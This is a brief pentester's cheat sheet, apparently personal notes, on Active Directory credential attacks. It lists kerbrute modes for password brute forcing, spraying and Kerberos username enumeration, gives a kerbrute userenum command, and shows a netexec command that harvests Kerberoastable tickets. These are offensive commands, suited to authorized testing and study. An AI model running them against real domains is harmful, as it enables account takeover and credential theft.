## kerbrute
https://github.com/ropnop/kerbrute
- **bruteuser** - Bruteforce a single user's password from a wordlist
- **bruteforce** - Read username:password combos from a file or stdin and test them
- **passwordspray** - Test a single password against a list of users
- **userenum** - Enumerate valid domain usernames via Kerberos

```bash
kerbrute userenum -d $domain --dc $ip $wordlist
```

## netexec 

```bash
nxc ldap $MACHINE.$DOAMIN -u 'USER'  -p 'PASS' --kerberoasting output.txt
```
